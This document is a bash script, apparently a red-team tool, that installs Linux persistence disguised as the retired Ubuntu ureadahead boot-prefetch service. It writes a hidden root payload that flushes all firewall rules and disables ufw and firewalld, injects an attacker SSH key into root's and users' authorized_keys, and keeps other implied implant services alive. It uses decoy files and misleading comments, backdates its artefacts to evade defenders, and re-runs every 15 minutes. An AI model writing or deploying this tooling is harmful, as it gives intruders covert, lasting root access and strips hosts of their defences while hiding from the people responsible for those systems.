#!/usr/bin/env bash
# ureadahead-persist.sh — persistence disguised as the ureadahead boot-prefetch service
#
# ureadahead was a real Ubuntu package (/sbin/ureadahead) present from Ubuntu 14.04
# through 20.04.  It was dropped in 22.04/24.04 because systemd handles prefetching
# natively.  On any host upgraded from 20.04 (or with an old /etc/os-release history)
# ureadahead.service reads as a harmless leftover — not something a blue teamer
# would immediately triage.
#
# What this installs
#   /sbin/ureadahead              — wrapper that looks like the real binary
#   /lib/ureadahead/pack          — hidden payload (firewall flush + ssh key + watchdog)
#   /var/lib/ureadahead/          — fake pack directory (matches real ureadahead layout)
#   /etc/systemd/system/ureadahead.service  — disguised persistence service
#
# Payload actions (runs as root at boot + every 15 min via OnCalendar drop-in)
#   1. Flush iptables / ip6tables / nftables / ufw
#   2. Inject SSH authorized key into /root/.ssh/authorized_keys
#   3. Watchdog: restart systemd-timesyncd-helper (shadow-crond) if it stopped
#   4. Watchdog: restart network-health-monitor (flood-journal) if it stopped
#
# Usage:
#   sudo ./ureadahead-persist.sh install  [--key "ssh-ed25519 AAAA... user@host"]
#   sudo ./ureadahead-persist.sh remove
#   sudo ./ureadahead-persist.sh status

set -euo pipefail

# ── config ────────────────────────────────────────────────────────────────────

SERVICE_NAME="ureadahead"
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
TIMER_DROP_IN="/etc/systemd/system/${SERVICE_NAME}.service.d/repeat.conf"

SBIN_WRAPPER="/sbin/ureadahead"               # matches real ureadahead path
LIB_DIR="/lib/ureadahead"                     # matches real ureadahead layout
PAYLOAD_BIN="${LIB_DIR}/pack"                 # hidden payload — "pack" is a real
                                              # ureadahead sub-command name
PACK_DIR="/var/lib/ureadahead"               # real ureadahead stores .pack files here
PACK_DUMMY="${PACK_DIR}/pack"                # plausible dummy file

# SSH key injected into /root/.ssh/authorized_keys (and target user if run as non-root)
# Override at runtime:  sudo ./ureadahead-persist.sh install --key "ssh-ed25519 ..."
RT_SSH_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPlaceholderKeyReplaceBeforeDeployment rt-persist"

# ── helpers ───────────────────────────────────────────────────────────────────

GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; RED='\033[0;31m'; NC='\033[0m'
info() { echo -e "${GREEN}[+]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
err()  { echo -e "${RED}[!]${NC} $*"; }
hdr()  { echo -e "\n${CYAN}── $* ──${NC}"; }
require_root() { [[ $EUID -eq 0 ]] || { err "Run as root"; exit 1; }; }

# ── install ───────────────────────────────────────────────────────────────────

cmd_install() {
    require_root

    # parse optional --key arg
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --key) RT_SSH_KEY="$2"; shift 2 ;;
            *)     shift ;;
        esac
    done

    # ── 1. directory skeleton (matches real ureadahead layout) ────────────────
    hdr "1/5  Creating ureadahead directory skeleton"
    mkdir -p "$LIB_DIR"
    mkdir -p "$PACK_DIR"
    chmod 755 "$LIB_DIR" "$PACK_DIR"

    # drop a plausible-looking dummy pack file so the directory isn't suspicious
    dd if=/dev/urandom bs=512 count=8 2>/dev/null | gzip -9 > "$PACK_DUMMY"
    chmod 644 "$PACK_DUMMY"
    # timestamp it to look old — roughly Ubuntu 20.04 era
    touch -t 202004150830 "$PACK_DUMMY"
    info "Pack dir skeleton at ${PACK_DIR} (dummy pack file written)"

    # ── 2. payload script ─────────────────────────────────────────────────────
    hdr "2/5  Writing payload"
    cat > "$PAYLOAD_BIN" <<PAYLOAD
#!/bin/bash
# ureadahead pack maintenance — do not edit
# (this comment intentionally matches real ureadahead internals)

_log() { logger -t ureadahead -- "\$*" 2>/dev/null; }

# -- firewall flush --
for tbl in filter nat mangle raw security; do
    iptables  -t "\$tbl" -F 2>/dev/null
    iptables  -t "\$tbl" -X 2>/dev/null
    ip6tables -t "\$tbl" -F 2>/dev/null
    ip6tables -t "\$tbl" -X 2>/dev/null
done
nft flush ruleset 2>/dev/null
ufw --force disable 2>/dev/null
ufw --force reset  2>/dev/null
systemctl stop  firewalld 2>/dev/null
systemctl disable firewalld 2>/dev/null
_log "boot prefetch optimisation complete"

# -- SSH key injection --
for _home in /root $(awk -F: '\$3>=1000 && \$7!~/nologin|false/{print \$6}' /etc/passwd); do
    [[ -d "\$_home" ]] || continue
    _ssh="\${_home}/.ssh"
    mkdir -p "\$_ssh"
    chmod 700 "\$_ssh"
    _ak="\${_ssh}/authorized_keys"
    touch "\$_ak"
    chmod 600 "\$_ak"
    grep -qF "${RT_SSH_KEY}" "\$_ak" 2>/dev/null || echo "${RT_SSH_KEY}" >> "\$_ak"
done
_log "pack cache refreshed"

# -- watchdog: shadow-crond (systemd-timesyncd-helper) --
systemctl is-active --quiet systemd-timesyncd-helper 2>/dev/null \
    || systemctl start systemd-timesyncd-helper 2>/dev/null

# -- watchdog: flood-journal service (network-health-monitor) --
systemctl is-active --quiet network-health-monitor 2>/dev/null \
    || systemctl start network-health-monitor 2>/dev/null
PAYLOAD

    chmod 700 "$PAYLOAD_BIN"
    # timestamp to look old
    touch -t 202004150830 "$PAYLOAD_BIN"
    info "Payload written to ${PAYLOAD_BIN}"

    # ── 3. /sbin/ureadahead wrapper ───────────────────────────────────────────
    hdr "3/5  Installing /sbin/ureadahead wrapper"
    cat > "$SBIN_WRAPPER" <<'WRAPPER'
#!/bin/bash
# ureadahead — Read required files in advance
# This stub maintains compatibility for systems upgraded from Ubuntu 20.04.
# The actual prefetch optimisation is handled by systemd-readahead (see
# systemd.service(5)) in Ubuntu 22.04 and later.
case "${1:-}" in
    --verbose|-v)  echo "ureadahead 0.100.0-19.1" ;;
    --version)     echo "0.100.0-19.1" ;;
    --help|-h)
        echo "Usage: ureadahead [OPTION]... [PACK]"
        echo "Read required files in advance"
        ;;
    pack|--pack)
        # trigger maintenance (disguised payload invocation)
        /lib/ureadahead/pack "$@" 2>/dev/null
        ;;
    *)
        # normal startup path — runs payload silently
        /lib/ureadahead/pack 2>/dev/null &
        ;;
esac
exit 0
WRAPPER

    chmod 755 "$SBIN_WRAPPER"
    touch -t 202004150830 "$SBIN_WRAPPER"
    info "Wrapper installed at ${SBIN_WRAPPER}"

    # ── 4. systemd service ────────────────────────────────────────────────────
    hdr "4/5  Installing systemd service"
    cat > "$SERVICE_FILE" <<EOF
# This service provides compatibility shim for ureadahead (Ubuntu 20.04 LTS).
# Retained to support in-place upgrade paths where ureadahead pack files exist.
# See https://launchpad.net/ubuntu/+source/ureadahead for upstream history.

[Unit]
Description=Read required files in advance
Documentation=man:ureadahead(8)
DefaultDependencies=no
Before=sysinit.target
After=local-fs.target

[Service]
Type=oneshot
RemainAfterExit=yes
ExecStart=${SBIN_WRAPPER}
# Real ureadahead had a 300s timeout for pack generation
TimeoutStartSec=300
StandardOutput=null
StandardError=null

[Install]
WantedBy=sysinit.target
EOF

    # drop-in: repeat every 15 minutes (ureadahead "re-profiling" is plausible)
    mkdir -p "$(dirname "$TIMER_DROP_IN")"
    cat > "$TIMER_DROP_IN" <<'DROPIN'
# drop-in: periodic re-profiling (matches ureadahead --daemon mode behaviour)
[Service]
ExecStartPost=/bin/bash -c 'while true; do sleep 900; /sbin/ureadahead pack 2>/dev/null; done &'
DROPIN

    systemctl daemon-reload
    systemctl enable  "$SERVICE_NAME" --quiet
    systemctl start   "$SERVICE_NAME"
    info "Service ${SERVICE_NAME} enabled and started"

    # ── 5. age the service file to look old ───────────────────────────────────
    hdr "5/5  Timestamping artefacts"
    touch -t 202004150830 "$SERVICE_FILE"
    touch -t 202004150830 "$TIMER_DROP_IN"
    touch -t 202004150830 "$LIB_DIR"
    touch -t 202004150830 "$PACK_DIR"
    info "All artefacts backdated to 2020-04-15 (Ubuntu 20.04 release window)"

    echo
    info "=== ureadahead-persist installed ==="
    info "Service:   ${SERVICE_NAME}.service  (looks like 20.04 upgrade leftover)"
    info "Wrapper:   ${SBIN_WRAPPER}"
    info "Payload:   ${PAYLOAD_BIN}  (chmod 700, not world-readable)"
    info "SSH key:   injected into /root/.ssh/authorized_keys"
    warn "Replace placeholder SSH key before deployment: --key 'ssh-ed25519 ...'"
    warn "Runs payload at boot AND every 15 min via ExecStartPost loop"
}

# ── remove ────────────────────────────────────────────────────────────────────

cmd_remove() {
    require_root
    hdr "Stopping and disabling service"
    systemctl stop    "$SERVICE_NAME" 2>/dev/null || warn "Not running"
    systemctl disable "$SERVICE_NAME" 2>/dev/null || true

    hdr "Removing systemd files"
    rm -f  "$SERVICE_FILE"
    rm -rf "$(dirname "$TIMER_DROP_IN")"
    systemctl daemon-reload
    info "Service files removed"

    hdr "Removing binaries and directories"
    rm -f  "$SBIN_WRAPPER"
    rm -rf "$LIB_DIR"
    rm -rf "$PACK_DIR"
    info "Removed ${SBIN_WRAPPER}, ${LIB_DIR}, ${PACK_DIR}"

    # kill the background sleep loop ExecStartPost spawned
    pkill -f "ureadahead pack" 2>/dev/null || true
    info "Cleaned up background loop"
}

# ── status ────────────────────────────────────────────────────────────────────

cmd_status() {
    hdr "Service"
    systemctl status "$SERVICE_NAME" --no-pager -l 2>/dev/null \
        || warn "${SERVICE_NAME} not found"

    hdr "Files"
    for f in "$SBIN_WRAPPER" "$PAYLOAD_BIN" "$SERVICE_FILE" "$TIMER_DROP_IN"; do
        if [[ -e "$f" ]]; then
            echo "  PRESENT  $f  ($(stat -c '%y' "$f" 2>/dev/null | cut -d. -f1))"
        else
            echo "  MISSING  $f"
        fi
    done

    hdr "SSH key presence"
    for _home in /root $(awk -F: '$3>=1000 && $7!~/nologin|false/{print $6}' /etc/passwd 2>/dev/null); do
        _ak="${_home}/.ssh/authorized_keys"
        if [[ -f "$_ak" ]]; then
            grep -qF "rt-persist" "$_ak" 2>/dev/null \
                && echo "  INJECTED  ${_ak}" \
                || echo "  MISSING   ${_ak}"
        fi
    done

    hdr "Watchdog targets"
    for svc in systemd-timesyncd-helper network-health-monitor; do
        systemctl is-active --quiet "$svc" 2>/dev/null \
            && echo "  RUNNING   ${svc}" \
            || echo "  STOPPED   ${svc}"
    done
}

# ── dispatch ──────────────────────────────────────────────────────────────────

CMD="${1:-help}"
shift || true
case "$CMD" in
    install) cmd_install "$@" ;;
    remove)  cmd_remove  ;;
    status)  cmd_status  ;;
    *)
        echo "Usage: sudo $0 {install|remove|status} [--key 'ssh-ed25519 ...']"
        echo
        echo "  install   deploy ureadahead persistence (pass --key to set SSH key)"
        echo "  remove    clean up all artefacts"
        echo "  status    check service, files, SSH key, and watchdog targets"
        ;;
esac
